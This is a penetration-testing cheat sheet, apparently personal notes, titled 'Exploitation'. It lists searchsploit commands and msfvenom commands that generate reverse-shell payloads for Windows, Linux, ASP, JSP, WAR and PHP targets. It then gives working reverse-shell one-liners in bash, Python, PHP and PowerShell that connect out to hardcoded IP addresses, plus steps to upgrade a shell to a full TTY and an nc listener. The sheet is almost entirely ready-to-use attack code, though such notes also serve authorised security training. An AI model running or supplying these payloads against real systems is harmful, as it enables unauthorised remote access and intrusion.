# ðŸ’£ Exploitation

## Locating public exploits

```shell
# search for an exploit
searchsploit <name>

# show the exploit
searchsploit -x <id>

# copy the exploit to the current folder
searchsploit -m <id>

# NSE
locate .nse | grep <name>
nmap --script-help <name>
```

## Reverse Shells

> [revshells.com](https://revshells.com)

### MSFVenom

```shell
# stageless x64 shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o reverse.elf
# meterpreter staged shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o reverse.elf


msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

### One liners

```shell
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

python -c 'import 
socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

<?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.106/443 0>&1');?>

# powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.45.230",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Check Connectivity

```shell
# in kali
sudo tcpdump -i tun0 icmp

# from the target
ping -c1 <kali_ip>
```

### Upgrade a Reverse Shell into a full TTY

Spawn a TTY Shell

```shell
# using Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/sh")'

# if Python is not available
/bin/bash -i
script /dev/null -c bash
```

Background the shell and fix settings

```shell
# CTRL+Z
stty raw -echo; fg
```

Set terminal env variables

```shell
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 40 columns 100
```

### Better listener with rlwrap

```shell
rlwrap nc -lnvp 4444
```
